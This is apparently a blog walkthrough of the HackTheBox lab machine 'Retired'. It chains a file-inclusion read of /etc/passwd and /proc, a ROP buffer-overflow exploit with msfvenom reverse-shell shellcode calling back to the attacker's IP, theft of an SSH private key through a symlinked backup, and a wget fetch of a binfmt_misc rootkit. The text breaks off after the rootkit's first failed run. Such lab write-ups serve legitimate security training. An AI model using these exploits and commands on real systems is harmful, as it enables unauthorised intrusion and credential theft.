---
title: "Walk-through of Retired from HackTheBox"
header:
  teaser: /assets/images/2022-06-15-22-51-20.png
toc: true
toc_sticky: true
excerpt_separator:  <!--more-->
categories:
  - CTF
tags:
  - HTB
  - CTF
  - Linux
  - LFI
  - BOF
  - NX Enabled
  - RELRO
  - GDB
  - Peda
  - ROP
  - msfvenom
  - binfmt_rootkit
---

[Retired](https://www.hackthebox.com/home/machines/profile/456) is a medium level machine by [uco2KFh](https://www.hackthebox.com/home/users/profile/590762) on [HackTheBox](https://www.hackthebox.com/home). It focuses on binary exploitation and taking advantage of poorly designed scripts and services.

<!--more-->

## Machine Information

![retired](/assets/images/2022-06-15-22-51-20.png)

We start with a website that is vulnerable to local file injections. We use this to enumerate the box and exfiltrate a binary which we find to be vulnerable to a buffer overflow attack. I spend quite some time going through the process of exploiting this because it has NX adn RELRO enabled. Once we have a working exploit we gain a shell to the box. From there we find a way to get an SSH private key, and then as a user we find the path to root is fairly simple by exploiting binfmt.

| Details |  |
| --- | --- |
| Hosting Site | [HackTheBox](https://www.hackthebox.eu) |
| Link To Machine | [HTB - Medium - Retired](https://www.hackthebox.com/home/machines/profile/456) |
| Machine Release Date | 2nd April 2022 |
| Date I Completed It | 25th June 2022 |
| Distribution Used | Kali 2022.1 – [Release Info](https://www.kali.org/blog/kali-linux-2022-1-release/) |

## Initial Recon

As always let's start with Nmap:

```text
┌──(root㉿kali)-[~/htb/retired]
└─# ports=$(nmap -p- --min-rate=1000 -T4 10.10.11.154 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//) 

┌──(root㉿kali)-[~/htb/retired]
└─# nmap -p$ports -sC -sV -oA retired 10.10.11.154
Starting Nmap 7.92 ( https://nmap.org ) at 2022-06-16 21:36 BST
Nmap scan report for 10.10.11.154
Host is up (0.028s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   3072 77:b2:16:57:c2:3c:10:bf:20:f1:62:76:ea:81:e4:69 (RSA)
|   256 cb:09:2a:1b:b9:b9:65:75:94:9d:dd:ba:11:28:5b:d2 (ECDSA)
|_  256 0d:40:f0:f5:a8:4b:63:29:ae:08:a1:66:c1:26:cd:6b (ED25519)
80/tcp open  http    nginx
| http-title: Agency - Start Bootstrap Theme
|_Requested resource was /index.php?page=default.html
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Nmap done: 1 IP address (1 host up) scanned in 8.97 seconds
```

Let's have a look at the website on port 80:

![retired-website](/assets/images/2022-06-16-22-01-10.png)

Nothing much here, but interesting that we have a index.php with a parameter called **page** that references a html file. We can use curl to test if default.html is an accessible file:

```sh
┌──(root㉿kali)-[/usr/share/seclists/Discovery/Web-Content]
└─# curl -sSL -D - http://10.10.11.154/default.html -o /dev/null
HTTP/1.1 200 OK
Server: nginx
Date: Thu, 16 Jun 2022 21:07:27 GMT
Content-Type: text/html
Content-Length: 11414
Last-Modified: Wed, 13 Oct 2021 02:58:57 GMT
Connection: keep-alive
ETag: "61664b71-2c96"
Accept-Ranges: bytes
```

## Feroxbuster

We get a 200 OK, and looking in browser its the same page. Time to look for other html pages using Feroxbuster:

```sh
┌──(root㉿kali)-[/usr/share/seclists/Discovery/Web-Content]
└─# feroxbuster -u http://10.10.11.154 -x html -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.11.154
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 💲  Extensions            │ [html]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
302      GET        0l        0w        0c http://10.10.11.154/ => /index.php?page=default.html
301      GET        7l       11w      162c http://10.10.11.154/js => http://10.10.11.154/js/
301      GET        7l       11w      162c http://10.10.11.154/css => http://10.10.11.154/css/
301      GET        7l       11w      162c http://10.10.11.154/assets => http://10.10.11.154/assets/
301      GET        7l       11w      162c http://10.10.11.154/assets/img => http://10.10.11.154/assets/img/
200      GET       72l      304w     4144c http://10.10.11.154/beta.html
[####################] - 59s   480000/480000  0s      found:10      errors:0      
```

## Beta Site

We see there's a page called beta.html, let's look at that:

![retired-beta](/assets/images/2022-06-16-22-12-35.png)

There's a box asking for a license key file, regardless of if you pick a random file to upload or just click Submit you end up at a blank page called activate_license.php:

![retired-activate](/assets/images/2022-06-16-22-17-40.png)

I couldn't find anything so went back to the parameter from earlier. This gives us the default.html file:

```sh
┌──(root㉿kali)-[/usr/share/seclists/Discovery/Web-Content]
└─# curl http://10.10.11.154/index.php?page=default.html
```

## File Exploration

Let's see if we can do directory traversal to get to other files like passwd:

```sh
┌──(root㉿kali)-[/usr/share/seclists/Discovery/Web-Content]
└─# curl "http://10.10.11.154/index.php?page=/etc/passwd" | grep -v nologin
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1488    0  1488    0     0  27009      0 --:--:-- --:--:-- --:--:-- 27054
root:x:0:0:root:/root:/bin/bash
sync:x:4:65534:sync:/bin:/bin/sync
vagrant:x:1000:1000::/vagrant:/bin/bash
dev:x:1001:1001::/home/dev:/bin/bash
```

We can, and can see there's a user called dev. Now let's look at that activate_license.php file:

```php
┌──(root㉿kali)-[/usr/share/seclists/Discovery/Web-Content]
└─# curl "http://10.10.11.154/index.php?page=activate_license.php"
<?php
if(isset($_FILES['licensefile'])) {
    $license      = file_get_contents($_FILES['licensefile']['tmp_name']);
    $license_size = $_FILES['licensefile']['size'];

    $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);
    if (!$socket) { echo "error socket_create()\n"; }

    if (!socket_connect($socket, '127.0.0.1', 1337)) {
        echo "error socket_connect()" . socket_strerror(socket_last_error()) . "\n";
    }

    socket_write($socket, pack("N", $license_size));
    socket_write($socket, $license);

    socket_shutdown($socket);
    socket_close($socket);
}
?>
```

## Enumeration Of /proc

You can see it's connecting to localhost port 1337, and then writing the contents of **licensefile** to it. We need to find a way to exploit this, first step is to find the process running on port 1337 on the box. To do that we can look at [proc](https://man7.org/linux/man-pages/man5/proc.5.html), the pseudo-filesystem which we covered in [Backdoor](https://pencer.io/ctf/ctf-htb-backdoor) a while ago.

[This](https://linuxhint.com/use-proc-filesystem-linux/) is a good article if you need more on how proc works, but basically a running process on the box will have a related folder inside /proc. We can use our ability to read files to loop through all folders inside /proc looking for the process that's running on port 1337.

The docs for proc tell us that the file called **cmdline** is what we need:

```text
  /proc/[pid]/cmdline
              This read-only file holds the complete command line for
              the process, unless the process is a zombie.
```

## Find PID

So we want to echo the contents that file inside of each [PID] folder:

```sh
┌──(root㉿kali)-[/usr/share/seclists/Discovery/Web-Content]
└─# for i in {410..415}; do curl -s http://10.10.11.154/index.php?page=/proc/$i/cmdline --output -; echo " <--" $i; done
 <-- 410
/usr/bin/activate_license1337 <-- 411
 <-- 412
 <-- 413
 <-- 414
 <-- 415
```

## Activate_license Binary

This is the shortened loop to save you waiting while it runs through hundreds of folders. As you can see there is a folder **/proc/411/** which contains a file called **cmdline** this contains the path to the binary that is running on that process ID [PID]. Now we have the full path to the activate_license binary we can download it:

```sh
┌──(root㉿kali)-[~/htb/retired]
└─# curl "http://10.10.11.154/index.php?page=/usr/bin/activate_license" -o activate_license
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 22536    0 22536    0     0   293k      0 --:--:-- --:--:-- --:--:--  297k

┌──(root㉿kali)-[~/htb/retired]
└─# file activate_license
activate_license: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=554631debe5b40be0f96cabea315eedd2439fb81, for GNU/Linux 3.2.0, with debug_info, not stripped
```

We have the file locally now on Kali. It's an executable, so pretty safe to assume we need to find a vulnerability like a buffer overflow.

First check the security on it:

```sh
┌──(root㉿kali)-[~/htb/retired]
└─# checksec --file=activate_license
[*] '/root/htb/retired/activate_license'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

## Buffer Overflow

The binary has a number of protections including RELRO and NX enabled. There is an exploit we can use to get around these called **Return Oriented Programming (ROP)** which lets us control the program flow even though we can't write to the stack directly. There's lots of great articles out there showing us how to use ROP gadgets, and a Python library called [Pwntools](https://docs.pwntools.com/en/stable/) which makes it much easier to write our script. If you need a primer on pwntools then try [this free room](https://tryhackme.com/room/introtopwntools) on TryHackMe. A few useful reads are [this](https://docs.pwntools.com/en/stable/rop/rop.html), [this](https://fir3wa1-k3r.github.io/2020/02/13/PWNing-binary-with-NX-and-ASLR-protections-enabled.html), [this](https://blog.xpnsec.com/rop-primer-level-0/), and [this](https://www.youtube.com/watch?v=ryK4Xv9Fw-o), [this](https://www.youtube.com/watch?v=HjiiYB4AXI8) and [this](https://www.youtube.com/watch?v=Ge01IzQH3Rg) for videos.

The basic idea is that we can't easily write to the stack to take control of the pointer like we did in the [Buffer Overflow room](https://pencer.io/ctf/ctf-thm-bofprep/) at TryHackMe. Instead we have to use instructions that are present in the shared object files used by the binary we want to exploit.

First we have to grab a couple of .so files that the binary uses. We can see those by looking at the maps file on the box:

```sh
┌──(root㉿kali)-[~/htb/retired]
└─# curl -s "http://10.10.11.154/index.php?page=/proc/$(curl -s "http://10.10.11.154/index.php?page=/proc/sched_debug" | grep activate_licens | awk '{print $3}')/maps"
```

## Shared Object Binaries

The above uses the [sched_debug](https://doc.opensuse.org/documentation/leap/archive/15.0/tuning/html/book.sle.tuning/cha.tuning.taskscheduler.html#sec.tuning.taskscheduler.cfs.debug) file to find the current pid of the activate_license binary running on the box then gets the maps file for it. From the long list these are the two files we're interested in:

```text
7f13f36a2000-7f13f36c7000 r--p 00000000 08:01 3634                       /usr/lib/x86_64-linux-gnu/libc-2.31.so
7f13f3867000-7f13f3877000 r--p 00000000 08:01 5321                       /usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6
```

We have the path to two shared object, let's download them:

```sh
┌──(root㉿kali)-[~/htb/retired]
└─# curl -s "http://10.10.11.154/index.php?page=/usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6" -o libsqlite3.so.0.8.6

┌──(root㉿kali)-[~/htb/retired]
└─# curl -s "http://10.10.11.154/index.php?page=/usr/lib/x86_64-linux-gnu/libc-2.31.so" -o libc-2.31.so
```

## Exploit Development

Just like we've done before the first step is to find the offset needed to cause the binary to crash. We do this by sending a large number of characters to it then counting how many it took to crash. This bit took me a while, but the key point is to crash the binary we have to send the data to it in a way it expects. To keep it simple I used the downloaded activate_license.php file to Kali, then started the built in php server to host it:

```sh
┌──(root㉿kali)-[~/htb/retired]
└─# php -S localhost:8080
[Wed Jun 22 22:33:50 2022] PHP 8.1.2 Development Server (http://localhost:8080) started
```

With that running I can send my payload to it and the php code will write it to the binary. This part of that php file being the bit we're interested in:

```php
    if (!socket_connect($socket, '127.0.0.1', 1337)) {
        echo "error socket_connect()" . socket_strerror(socket_last_error()) . "\n";
    }
    socket_write($socket, pack("N", $license_size));
    socket_write($socket, $license);
```

As you can see it write to port 1337 locally. So we next to get the activate_license binary running so the php script can write to it. For that we need gdb, so when the binary crashes we can look up the registers to see the offset.

## GDB And Peda

Install [gdb](https://www.sourceware.org/gdb/) if you haven't got it:

```sh
apt install gdb
```

Also install [peda](https://github.com/longld/peda) which adds a number of useful commands to gdb:

```sh
git clone https://github.com/longld/peda.git ~/peda
echo "source ~/peda/peda.py" >> ~/.gdbinit
```

Now start gdb with the activate_license binary:

```sh
┌──(root㉿kali)-[~]
└─# gdb -q --args ./activate_license 1337
Reading symbols from ./activate_license...
```

Next we need to create a unique pattern of characters that we will send to crash the binary:

```sh
gdb-peda$ pattern_create 1000 pencer.txt
Writing pattern of 1000 chars to filename "pencer.txt"
```

Now we can run the binary:

```sh
gdb-peda$ run
Starting program: /root/htb/retired/activate_license 1337
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[+] starting server listening on port 1337
[+] listening ...
```

So now we have our PHP server hosting the php script that will push our payload to the binary running in gdb and listening on port 1337. Next we need a simple Python script to send the pattern we've just created:

```sh
┌──(root㉿kali)-[~/htb/retired]
└─# cat pencer.py
import requests
f = open("pencer.txt", "r")
payload = f.read()
f.close()
r = requests.post(f"http://localhost:8080/activate_license.php", files = { "licensefile": payload } )
```

This is just reading in our txt file containing the 1000 character pattern we created in gdb. Then it posts it to the php script which write it to the activate_license binary running in gdb:

```sh
┌──(root㉿kali)-[~/htb/retired]
└─# python pencer.py
```

## Segmentation Fault

If we switch to gdb now we'll see it's crashed:

```sh
Thread 2.1 "activate_licens" received signal SIGSEGV, Segmentation fault.
[Switching to Thread 0x7ffff7b0f480 (LWP 2819)]
[----------------------------------registers-----------------------------------]
RAX: 0x338 
RBX: 0x5555555557c0 (<__libc_csu_init>: push   r15)
RCX: 0x0 
RDX: 0x0 
RSI: 0x0 
RDI: 0x7fffffffdb40 --> 0x7ffff7cd3d70 (<__funlockfile>:  mov rdi,QWORD PTR [rdi+0x88])
RBP: 0x4e73413873416973 ('siAs8AsN')
RSP: 0x7fffffffe2d8 ("AsjAs9AsOAsk<SNIP>ABMABiAB8AB"...)
RIP: 0x5555555555c0 (<activate_license+643>:    ret)
R8 : 0xfffffffffffffff7 
R9 : 0x7ffff7e0d0c0 --> 0x0 
R10: 0x7ffff7e0cfc0 --> 0x0 
R11: 0x246 
R12: 0x555555555220 (<_start>:  xor    ebp,ebp)
R13: 0x0 
R14: 0x0 
R15: 0x0
EFLAGS: 0x10202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
<SNIP>
Stopped reason: SIGSEGV
```

The binary crashed with a segmentation fault, which means we overflowed the buffer so now we can see what the offset was:

```sh
gdb-peda$ x/wx $rsp
0x7fffffffe2d8: 0x416a7341
gdb-peda$ pattern_offset 0x416a7341
1097495361 found at offset: 520
```

Here we looked at the contents of the RSP register which gave us the value **0x416a7341**, then we searched the pattern we created using **pattern_offset** to find that value. The match was at 520 so that's our offset which we'll use to build our exploit script.

## Memory Addresses

As mentioned earlier with NX enabled we'll be using ROP gadgets to get around it, so next we need to know the current memory addresses of libc-2.31.so and libsqlite3.so.0.8.6. With the memory address being dynamic it means each time the box is rebooted the address will change, we can use the maps file in /proc to get us the current values:

```sh
┌──(root㉿kali)-[~/htb/retired]
└─# libc_start=$(curl -s "http://10.10.11.154/index.php?page=/proc/$(curl -s "http://10.10.11.154/index.php?page=/proc/sched_debug" | grep activate_licens | awk '{print $3}')/maps" | grep -m 1 "/usr/lib/x86_64-linux-gnu/libc-2.31.so" | awk -F[-] '{print $1}')

┌──(root㉿kali)-[~/htb/retired]
└─# libsqlite_start=$(curl -s "http://10.10.11.154/index.php?page=/proc/$(curl -s "http://10.10.11.154/index.php?page=/proc/sched_debug" | grep activate_licens | awk '{print $3}')/maps" | grep -m 1 "/usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6" | awk -F[-] '{print $1}')
```

We also need the stack address:

```sh
┌──(root㉿kali)-[~/htb/retired]
└─# stack_start=$(curl -s "http://10.10.11.154/index.php?page=/proc/$(curl -s "http://10.10.11.154/index.php?page=/proc/sched_debug" | grep activate_licens | awk '{print $3}')/maps" | grep -m 1 "stack" | awk -F[-] '{print $1}')

┌──(root㉿kali)-[~/htb/retired]
└─# stack_end=$(curl -s "http://10.10.11.154/index.php?page=/proc/$(curl -s "http://10.10.11.154/index.php?page=/proc/sched_debug" | grep activate_licens | awk '{print $3}')/maps" | grep -m 1 "stack" | awk -F[-] '{print $2}' | cut -d ' ' -f 1)
```

Make a note of the values for our script:

```sh
┌──(root㉿kali)-[~/htb/retired]
└─# echo $libc_start, $libsqlite_start, $stack_start, $stack_end
7fb1ff018000, 7fb1ff1dd000, 7fffddc82000, 7fffddca3000
```

## MSFVenom Shellcode

We also need a payload. We can use msfvenom to create shellcode in Python friendly format which points to our current Kali IP and port:

```sh
┌──(root㉿kali)-[~/htb/retired]
└─# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.198 LPORT=4444 -f py
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of py file: 373 bytes
buf =  b""
buf += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48"
buf += b"\x97\x48\xb9\x02\x00\x11\x5c\x0a\x0a\x0e\xc6\x51\x48"
buf += b"\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e"
buf += b"\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58"
buf += b"\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48"
buf += b"\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05"
```

## Final Exploit Script

Now we can put together our script:

```python
from pwn import *
import requests

## Set Runtime variables
context.binary = './activate_license'
## Change the value of int to what we retrieved above
libc_start = int('7fb1ff018000', 16)
## Path to the binary on the box which we found earlier
libc_path = "/usr/lib/x86_64-linux-gnu/libc-2.31.so"
## Change the value of int to what we retrieved above
libsqlite_start = int('7fb1ff1dd000', 16)
## Path to the binary on the box which we found earlier
libsqlite_path = "/usr/lib/x86_64-linux-gnu/libsqlite3.so.0.8.6"
## Change the value of int to what we retrieved above
stack_start = int('7fffddc82000', 16)
stack_end  = int('7fffddca3000', 16)
## Calculate length of stack
stack_length = stack_end - stack_start
## Paste shellcode from msfvenom we created earlier, make sure you have your Kali IP and port
buf =  b""
buf += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48"
buf += b"\x97\x48\xb9\x02\x00\x11\x5c\x0a\x0a\x0e\xc6\x51\x48"
buf += b"\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e"
buf += b"\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58"
buf += b"\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48"
buf += b"\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05"
## Use pwntools to create an object of the libc-2.31.so file we downloaded
libc          = ELF("./libc-2.31.so",checksec=False)
## Set start address to value we set above
libc.address  = libc_start
## Use pwntools to create an object of the libspqlite3.so.0.8.6 file we downloaded
libsql        = ELF("./libsqlite3.so.0.8.6",checksec=False)
## Set start address to value we set above
libsql.address = libsqlite_start
## Use pwntools ROP function to create an oject containing the libc and libsql objects we created above
rop            = ROP([libc, libsql])
## Look at the symbols table for value of mprotect in the libc object we created above
mprotect = libc.symbols['mprotect']
## Look in the rop object created above for the following register addresses
pop_rdi  = rop.rdi[0]
pop_rsi  = rop.rsi[0]
pop_rdx  = rop.rdx[0]
jmp_rsp  = rop.jmp_rsp[0]
## Set offset to the value we found earlier by causing a segfault
offset  = 520
# Build payload using all of the above
payload = b'A' * offset
payload += p64(pop_rdi) + p64(stack_start)
payload += p64(pop_rsi) + p64(stack_length)
payload += p64(pop_rdx) + p64(7)
payload += p64(mprotect)
payload += p64(jmp_rsp)
payload += buf
# Post payload to the binary on the box to crash it like we did locally
requests.post('http://10.10.11.154/activate_license.php', files = { "licensefile": payload } )
```

Save this once you've updated it with the current values for libc, libsql, stack and your msfvenom shellcode. Start a nc listening on the port you chose then run the script:

```sh
┌──(root㉿kali)-[~/htb/retired]
└─# python pencer_exploit.py
[*] '/root/htb/retired/activate_license'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] Loaded 190 cached gadgets for './libc-2.31.so'
[*] Loaded 162 cached gadgets for './libsqlite3.so.0.8.6'
```

## Reverse Shell

Switch to our waiting nc to see we finally have a reverse shell to the box:

```sh
┌──(root㉿kali)-[~/htb/retired]
└─# nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.14.198] from (UNKNOWN) [10.10.11.154] 44748
```

First thing as always is upgrade to a better shell:

```sh
┌──(root㉿kali)-[~/htb/retired]
└─# nc -nlvp 4444
listening on [any] 4444 ...
/usr/bin/python3 -c 'import pty;pty.spawn("/usr/bin/bash")'
www-data@retired:/var/www$ ^Z
zsh: suspended  nc -nlvp 4444
┌──(root㉿kali)-[~/htb/retired]
└─# stty raw -echo; fg
[1]  + continued  nc -nlvp 4444
www-data@retired:/var/www$ stty rows 60 cols 236
www-data@retired:/var/www$ export TERM=xterm
```

A look in our current folder shows suspicious files:

```sh
www-data@retired:/var/www$ ls -l
-rw-r--r-- 1 dev      www-data 505153 Jun 25 11:12 2022-06-25_11-12-04-html.zip
-rw-r--r-- 1 dev      www-data 505153 Jun 25 11:13 2022-06-25_11-13-01-html.zip
-rw-r--r-- 1 dev      www-data 505153 Jun 25 11:14 2022-06-25_11-14-04-html.zip
drwxrwsrwx 5 www-data www-data   4096 Mar 11 14:36 html
-rw-r--r-- 1 www-data www-data  20480 Jun 25 10:56 license.sqlite
```

Three zip files with creation time one minute apart suggests there is a task running regularly to create them. Let's search for files containing the part of the filename that is consistent:

```sh
www-data@retired:/var/www$ grep -r / -e '-html.zip' 2>/dev/null
/usr/bin/webbackup:DST="/var/www/$(date +%Y-%m-%d_%H-%M-%S)-html.zip"
```

## Website Backup

We find a file called webbackup, let's look at that:

```sh
www-data@retired:/var/www$ cat /usr/bin/webbackup 
#!/bin/bash
set -euf -o pipefail
cd /var/www/
SRC=/var/www/html
DST="/var/www/$(date +%Y-%m-%d_%H-%M-%S)-html.zip"
/usr/bin/rm --force -- "$DST"
/usr/bin/zip --recurse-paths "$DST" "$SRC"
KEEP=10
/usr/bin/find /var/www/ -maxdepth 1 -name '*.zip' -print0 \
    | sort --zero-terminated --numeric-sort --reverse \
    | while IFS= read -r -d '' backup; do
        if [ "$KEEP" -le 0 ]; then
            /usr/bin/rm --force -- "$backup"
        fi
        KEEP="$((KEEP-1))"
    done
```

It's a simple script that takes the contents of /var/www/html and backs it up to a file in /var/www. Let's look to see what is triggering the script:

```sh
www-data@retired:/var/www$ grep -r /etc -e 'webbackup' 2>/dev/null
/etc/systemd/system/website_backup.service:ExecStart=/usr/bin/webbackup
```

We can see there is a service in systemd that is executing the webbackup script. Let's look at the service:

```sh
www-data@retired:/var/www$ cat /etc/systemd/system/website_backup.service
[Unit]
Description=Backup and rotate website
[Service]
User=dev
Group=www-data
ExecStart=/usr/bin/webbackup
[Install]
WantedBy=multi-user.target
```

The service is being run by user dev, let's look at /home:

```sh
www-data@retired:/var/www/html$ ls -l /home
drwx------ 6 dev dev 4096 Mar 11 14:36 dev
```

## Symbolic Link

We see dev is the only user but we can't look inside. Thinking back to the start we saw port 22 open on the nmap scan. So safe to assume the dev user will have access, which probably means an id_rsa key pair for ssh access in their .ssh folder. We have permissions to create a symbolic link in the folder being backed up to a file in dev home folder because the script is running in their context. So just do it like we did in [Seal](https://pencer.io/ctf/ctf-htb-seal/):

```sh
www-data@retired:/var/www/html$ ln -s /home/dev/.ssh/id_rsa /var/www/html/id_rsa

ww-data@retired:/var/www/html$ ls -l
-rw-rwSrw- 1 www-data www-data   585 Oct 13  2021 activate_license.php
drwxrwsrwx 3 www-data www-data  4096 Mar 11 14:36 assets
-rw-rwSrw- 1 www-data www-data  4144 Mar 11 11:34 beta.html
drwxrwsrwx 2 www-data www-data  4096 Mar 11 14:36 css
-rw-rwSrw- 1 www-data www-data 11414 Oct 13  2021 default.html
lrwxrwxrwx 1 www-data www-data    21 Jun 25 11:46 id_rsa -> /home/dev/.ssh/id_rsa
-rw-rwSrw- 1 www-data www-data   348 Mar 11 11:29 index.php
drwxrwsrwx 2 www-data www-data  4096 Mar 11 14:36 js
```

We see our symbolic link in there, now wait for the script to run. When the new backup is there copy it out so it doesn't get removed and unzip:

```sh
ww-data@retired:/var/www/html$ cd /dev/shm
www-data@retired:/dev/shm$ cp /var/www/2022-06-25_11-47-04-html.zip .
www-data@retired:/dev/shm$ unzip 2022-06-25_11-47-04-html.zip 
Archive:  2022-06-25_11-47-04-html.zip
   creating: var/www/html/
   creating: var/www/html/js/
<SNIP>
```

Now we can see the id_rsa we've copied in to that backup:

```sh
www-data@retired:/dev/shm/var/www/html$ cat id_rsa 
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAA
BAAABlwAAAAdzc2gtcnNhAAAAAwEAAQAAAYEA58qqrW05/urHKC
CqCgcIPhGka60Y+nQcngHS6IvG44gcb3w0HN/yfdb6Nzw5wfLeL
D4uDt8k9M7RPgkdnIRwdNFxleNHuHWmK0j7OOQ0rUsrs8LudOdk
<SNIP>
7rTyG3wbNka1sAAAALZGV2QHJldGlyZWQ=
-----END OPENSSH PRIVATE KEY-----
```

## SSH As Dev

Now we can paste that key in to a file on Kali and ssh in as the dev user:

```sh
┌──(root㉿kali)-[~/htb/retired]
└─# nano id_rsa           

┌──(root㉿kali)-[~/htb/retired]
└─# chmod 600 id_rsa         

┌──(root㉿kali)-[~/htb/retired]
└─# ssh -i id_rsa dev@10.10.11.154 
Last login: Mon Mar 28 11:36:17 2022 from 10.10.14.23
dev@retired:~$
```

Let's grab the user flag before moving on:

```sh
dev@retired:~$ cat user.txt 
1908e78d7623086e78a6a7261db3528f
```

Looking in our home folder we find an interesting folder:

```sh
dev@retired:~$ ls -l
4 drwx------ 2 dev  dev  4096 Mar 11 14:36 activate_license
4 drwx------ 3 dev  dev  4096 Mar 11 14:36 emuemu
4 -rw-r----- 1 root dev    33 Jun 24 05:11 user.txt
```

What is emuemu? Let's look:

```sh
dev@retired:~$ cd emuemu/
dev@retired:~/emuemu$ ls -l
-rw------- 1 dev dev   673 Oct 13  2021 Makefile
-rw------- 1 dev dev   228 Oct 13  2021 README.md
-rw------- 1 dev dev 16608 Oct 13  2021 emuemu
-rw------- 1 dev dev   168 Oct 13  2021 emuemu.c
-rw------- 1 dev dev 16864 Oct 13  2021 reg_helper
-rw------- 1 dev dev   502 Oct 13  2021 reg_helper.c
drwx------ 2 dev dev  4096 Mar 11 14:36 test
```

THe README.md tells us about a software emulator but looking at the files it's not yet written. The reg_helper binary sounds interesting, we can see the source code of it in the .c file:

```c
dev@retired:~/emuemu$ cat reg_helper.c 
#define _GNU_SOURCE

#include <fcntl.h>
#include <stdio.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <unistd.h>

int main(void) {
    char cmd[512] = { 0 };

    read(STDIN_FILENO, cmd, sizeof(cmd)); cmd[-1] = 0;

    int fd = open("/proc/sys/fs/binfmt_misc/register", O_WRONLY);
    if (-1 == fd)
        perror("open");
    if (write(fd, cmd, strnlen(cmd,sizeof(cmd))) == -1)
        perror("write");
    if (close(fd) == -1)
        perror("close");

    return 0;
}
```

## Binfmt Exploit

This is just [reading](https://linux.die.net/man/3/read) a file in from STDIN, [opening](https://linux.die.net/man/3/open) the register file in binfmt_misc, and then [writing](https://linux.die.net/man/3/write) out to it. Clearly this needs further investigation, so with a bit of searching I found [this](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation/sensitive-mounts#proc-sys-fs-binfmt_misc) on HackTricks which tells us:

```text
Poor man's rootkit, leverage binfmt_misc's credentials option to escalate privilege through any suid binary (and to get a root shell) if /proc/sys/fs/binfmt_misc/register is writeable.
```

Looking at the register file we see it's only writeable for the owner which is root:

```sh
dev@retired:~/emuemu$ ls -ls /proc/sys/fs/binfmt_misc/register
0 --w------- 1 root root 0 Jun 24 05:11 /proc/sys/fs/binfmt_misc/register 
```

There's an exploit [here](https://github.com/toffan/binfmt_misc) that HackTricks points us to:

```sh
┌──(root㉿kali)-[~/htb/retired]
└─# git clone https://github.com/toffan/binfmt_misc.git
Cloning into 'binfmt_misc'...
remote: Enumerating objects: 42, done.
remote: Total 42 (delta 0), reused 0 (delta 0), pack-reused 42
Receiving objects: 100% (42/42), 17.83 KiB | 570.00 KiB/s, done.
Resolving deltas: 100% (20/20), done.

┌──(root㉿kali)-[~/htb/retired/binfmt_misc]
└─# python3 -m http.server 80  
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Pull it over to the box and run it:

```sh
dev@retired:~$ wget http://10.10.14.198/binfmt_rootkit
--2022-06-25 16:45:44--  http://10.10.14.198/binfmt_rootkit
Connecting to 10.10.14.198:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2048 (2.0K) [application/octet-stream]
Saving to: ‘binfmt_rootkit’
binfmt_rootkit     100%[===========>]   2.00K  --.-KB/s    in 0s
2022-06-25 16:45:44 (350 MB/s) - ‘binfmt_rootkit’ saved [2048/2048]

dev@retired:~$ chmod +x binfmt_rootkit 

dev@retired:~$ ./binfmt_rootkit
Error: /proc/sys/fs/binfmt_misc/register is not writeable
```

